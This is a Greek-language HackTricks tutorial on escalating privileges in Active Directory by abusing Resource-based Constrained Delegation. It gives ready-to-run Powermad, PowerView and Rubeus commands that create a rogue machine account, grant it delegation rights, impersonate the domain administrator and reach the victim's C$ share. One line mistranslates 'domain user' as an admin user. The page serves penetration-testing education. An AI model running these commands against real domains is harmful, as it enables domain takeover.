# Resource-based Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Βασικές Αρχές της Resource-based Constrained Delegation

Αυτό είναι παρόμοιο με την βασική [Constrained Delegation](constrained-delegation.md) αλλά **αντί** να δίνει δικαιώματα σε ένα **αντικείμενο** να **παριστάνει οποιονδήποτε χρήστη απέναντι σε μια υπηρεσία**. Η Resource-based Constrained Delegation **ορίζει** στο **αντικείμενο ποιος μπορεί να παριστάνει οποιονδήποτε χρήστη απέναντί του**.

Σε αυτή την περίπτωση, το περιορισμένο αντικείμενο θα έχει ένα χαρακτηριστικό που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να παριστάνει οποιονδήποτε άλλο χρήστη απέναντί του.

Μια άλλη σημαντική διαφορά από αυτή την Constrained Delegation σε άλλες delegations είναι ότι οποιοσδήποτε χρήστης με **δικαιώματα εγγραφής σε έναν λογαριασμό μηχανής** (_GenericAll/GenericWrite/WriteDacl/WriteProperty κ.λπ.) μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Σε άλλες μορφές Delegation χρειάζεστε δικαιώματα διαχειριστή τομέα).

### Νέες Έννοιες

Στην Constrained Delegation είχε αναφερθεί ότι η **`TrustedToAuthForDelegation`** σημαία μέσα στην τιμή _userAccountControl_ του χρήστη είναι απαραίτητη για να εκτελέσετε ένα **S4U2Self.** Αλλά αυτό δεν είναι εντελώς αλήθεια.\
Η πραγματικότητα είναι ότι ακόμη και χωρίς αυτή την τιμή, μπορείτε να εκτελέσετε ένα **S4U2Self** απέναντι σε οποιονδήποτε χρήστη αν είστε μια **υπηρεσία** (έχετε ένα SPN) αλλά, αν έχετε **`TrustedToAuthForDelegation`** το επιστρεφόμενο TGS θα είναι **Forwardable** και αν **δεν έχετε** αυτή τη σημαία το επιστρεφόμενο TGS **δεν θα** είναι **Forwardable**.

Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** είναι **NOT Forwardable** προσπαθώντας να εκμεταλλευτείτε μια **βασική Constrain Delegation** δεν **θα λειτουργήσει**. Αλλά αν προσπαθείτε να εκμεταλλευτείτε μια **Resource-Based constrain delegation, θα λειτουργήσει** (αυτό δεν είναι ευπάθεια, είναι χαρακτηριστικό, προφανώς).

### Δομή Επίθεσης

> Αν έχετε **ισοδύναμα δικαιώματα εγγραφής** σε έναν **λογαριασμό Υπολογιστή** μπορείτε να αποκτήσετε **προνομιακή πρόσβαση** σε αυτή τη μηχανή.

Ας υποθέσουμε ότι ο επιτιθέμενος έχει ήδη **ισοδύναμα δικαιώματα εγγραφής πάνω στον υπολογιστή του θύματος**.

1. Ο επιτιθέμενος **παραβιάζει** έναν λογαριασμό που έχει ένα **SPN** ή **δημιουργεί έναν** (“Υπηρεσία A”). Σημειώστε ότι **οποιοσδήποτε** _Διαχειριστής Χρήστης_ χωρίς καμία άλλη ειδική προνομία μπορεί να **δημιουργήσει** μέχρι 10 **αντικείμενα Υπολογιστή (**_**MachineAccountQuota**_**)** και να τους ορίσει ένα **SPN**. Έτσι, ο επιτιθέμενος μπορεί απλά να δημιουργήσει ένα αντικείμενο Υπολογιστή και να ορίσει ένα SPN.
2. Ο επιτιθέμενος **καταχράται το δικαίωμα ΕΓΓΡΑΦΗΣ** του πάνω στον υπολογιστή του θύματος (ΥπηρεσίαB) για να ρυθμίσει **resource-based constrained delegation ώστε να επιτρέψει στην ΥπηρεσίαA να παριστάνει οποιονδήποτε χρήστη** απέναντι σε αυτόν τον υπολογιστή του θύματος (ΥπηρεσίαB).
3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από την Υπηρεσία A στην Υπηρεσία B για έναν χρήστη **με προνομιακή πρόσβαση στην Υπηρεσία B**.
1. S4U2Self (από τον λογαριασμό SPN που παραβιάστηκε/δημιουργήθηκε): Ζητήστε ένα **TGS του Διαχειριστή για μένα** (Not Forwardable).
2. S4U2Proxy: Χρησιμοποιήστε το **μη Forwardable TGS** του προηγούμενου βήματος για να ζητήσετε ένα **TGS** από τον **Διαχειριστή** προς τον **υπολογιστή θύμα**.
3. Ακόμη και αν χρησιμοποιείτε ένα μη Forwardable TGS, καθώς εκμεταλλεύεστε την Resource-based constrained delegation, θα λειτουργήσει.
4. Ο επιτιθέμενος μπορεί να **περάσει το εισιτήριο** και να **παριστάνει** τον χρήστη για να αποκτήσει **πρόσβαση στην ΥπηρεσίαB του θύματος**.

Για να ελέγξετε το _**MachineAccountQuota**_ του τομέα μπορείτε να χρησιμοποιήσετε:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία Αντικειμένου Υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στο τομέα χρησιμοποιώντας [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Ρύθμιση R**esource-based Constrained Delegation**

**Χρησιμοποιώντας το module PowerShell του activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρησιμοποιώντας το powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση πλήρους επίθεσης S4U

Πρώτα απ' όλα, δημιουργήσαμε το νέο αντικείμενο Υπολογιστή με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τους κατακερματισμούς RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, η επίθεση μπορεί να εκτελεστεί:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα εισιτήρια απλά ζητώντας μία φορά χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Σημειώστε ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Δεν μπορεί να ανατεθεί**". Εάν ένας χρήστης έχει αυτό το χαρακτηριστικό σε True, δεν θα μπορείτε να τον προσποιηθείτε. Αυτή η ιδιότητα μπορεί να προβληθεί μέσα στο bloodhound.
{% endhint %}

### Πρόσβαση

Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη επίθεση S4U και θα εισάγει το TGS** από τον Διαχειριστή στον θύμα υπολογιστή στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Διαχειριστή, οπότε θα μπορείτε να έχετε πρόσβαση στο **C$**:
```bash
ls \\victim.domain.local\C$
```
### Κατάχρηση διαφόρων υπηρεσιών εισιτηρίων

Μάθετε για τα [**διαθέσιμα εισιτήρια υπηρεσιών εδώ**](silver-ticket.md#available-services).

## Σφάλματα Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos είναι ρυθμισμένο να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το hash RC4. Παρέχετε στο Rubeus τουλάχιστον το hash AES256 (ή απλά παρέχετε τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή είναι διαφορετική από αυτήν του DC και το kerberos δεν λειτουργεί σωστά.
* **`preauth_failed`**: Αυτό σημαίνει ότι το δεδομένο όνομα χρήστη + hashes δεν λειτουργούν για είσοδο. Ίσως να ξεχάσατε να βάλετε το "$" μέσα στο όνομα χρήστη κατά την παραγωγή των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
* Ο χρήστης που προσπαθείτε να προσποιηθείτε δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον προσποιηθείτε ή επειδή δεν έχει αρκετά δικαιώματα)
* Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητήσετε ένα εισιτήριο για winrm αλλά το winrm δεν εκτελείται)
* Ο ψεύτικος υπολογιστής που δημιουργήθηκε έχει χάσει τα δικαιώματά του πάνω στον ευάλωτο διακομιστή και πρέπει να τα επαναφέρετε.

## Αναφορές

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
